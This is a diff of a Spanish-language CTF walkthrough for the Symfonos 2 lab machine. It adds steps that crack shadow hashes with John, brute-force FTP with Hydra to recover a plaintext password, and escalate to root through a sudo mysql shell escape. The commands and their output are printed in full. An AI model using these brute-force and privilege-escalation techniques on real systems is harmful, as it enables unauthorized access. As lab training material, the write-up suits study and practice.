@@ -254,8 +254,29 @@ root@kali:~/SYMFONOS2/autorecon/10.10.10.151/scans# cat tcp_80_http_gobuster.txt
 - Vamos aprovechar que hemos podido descargar los archivos PASSWD.BAK y SHADOW.BAK y para a crackearlos.
 
 ```
+root@kali:~/SYMFONOS2# john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Remaining 2 password hashes with 2 different salts
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
 
 ```
+
+Importante: demoraba mucho el proceso asi que lo realicé con HYDRA.
+
+```
+root@kali:~/SYMFONOS2# hydra -t 10 -l aeolus -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.151
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-28 19:20:57
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries (l:1/p:14344399), ~1434440 tries per task
+[DATA] attacking ftp://10.10.10.151:21/
+[21][ftp] host: 10.10.10.151   login: aeolus   password: sergioteamo
+```
+
+<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos16.jpg" with=80% />
+
 
 > Obtenemos las siguientes credenciales aeolus:sergioteamo. 
 
@@ -375,7 +396,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
 
 
 - La vulnerabilidad de RCE está detallada aquí: https://www.exploit-db.com/exploits/47044. Requiere autenticar en el sistema.
-- Toca leer el detalle de la vulnerabilidad y entender el SCRIPT. Auntenticamos el usuario aeolus:sergioteamo.
+- IMPORTANTE: Toca leer el detalle de la vulnerabilidad y entender el SCRIPT. Auntenticamos el usuario aeolus:sergioteamo.
 - Para explotar la vulnerabilidad debemos añadir un dispositivo.
 
 ```
@@ -403,15 +424,103 @@ uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
 <img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos14.jpg" with=80% />
 
 
+## 5. Elevar Privilegios
 
+- Ahora que tenemos acceso con el usuario CRONUS vamos a intentar elevar privilegios nuevamente.
 
+### 5.1. Elevar a través de SUDO
 
+```
+cronus@symfonos2:/opt/librenms/html$ sudo -l
+sudo -l
+Matching Defaults entries for cronus on symfonos2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
+User cronus may run the following commands on symfonos2:
+    (root) NOPASSWD: /usr/bin/mysql
 
+```
 
+- Ejecutamos el comando mencionado y podemos tener acceso a MYSQL. Después de buscar información sensible, NO ENCONTRÉ NADA.
 
+```
+cronus@symfonos2:/opt/librenms/html$ sudo /usr/bin/mysql
+sudo /usr/bin/mysql
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 319
+Server version: 10.1.38-MariaDB-0+deb9u1 Debian 9.8
 
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| librenms           |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.00 sec)
+```
+
+> Ejecutamos /bin/sh a través de MYSQL y obtenemos acceso.
+
+```
+$ sudo -l 
+Matching Defaults entries for cronus on symfonos2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cronus may run the following commands on symfonos2:
+    (root) NOPASSWD: /usr/bin/mysql
+$ sudo /usr/bin/mysql -e "!\ /bin/sh"
+ERROR at line 1: Unknown command '\ '.
+$ sudo /usr/bin/mysql -e "! /bin/sh"
+ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '! /bin/sh' at line 1
+$ sudo /usr/bin/mysql -e "!/ /bin/sh"
+ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '!/ /bin/sh' at line 1
+$ sudo /usr/bin/mysql "\! /bin/sh"
+ERROR 1049 (42000): Unknown database '\! /bin/sh'
+$ sudo /usr/bin/mysql -e "\! /bin/sh"
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+cat proof.txt
+
+	Congrats on rooting symfonos:2!
+
+           ,   ,
+         ,-`{-`/
+      ,-~ , \ {-~~-,
+    ,~  ,   ,`,-~~-,`,
+  ,`   ,   { {      } }                                             }/
+ ;     ,--/`\ \    / /                                     }/      /,/
+;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
+; /   `       } } `, `-`-.___                            / `,  ,/  `,/
+ \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
+  `        { {                                     __  /  ,`/   ,`,;
+        /   \ \                                 _,`, `{  `,{   `,`;`
+       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
+       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
+        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
+                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
+                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
+       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
+      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
+     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
+    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
+  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
+/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,
+
+	Contact me via Twitter @zayotic to give feedback!
+
+```
+
+<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos15.jpg" with=80% />
 
 
 
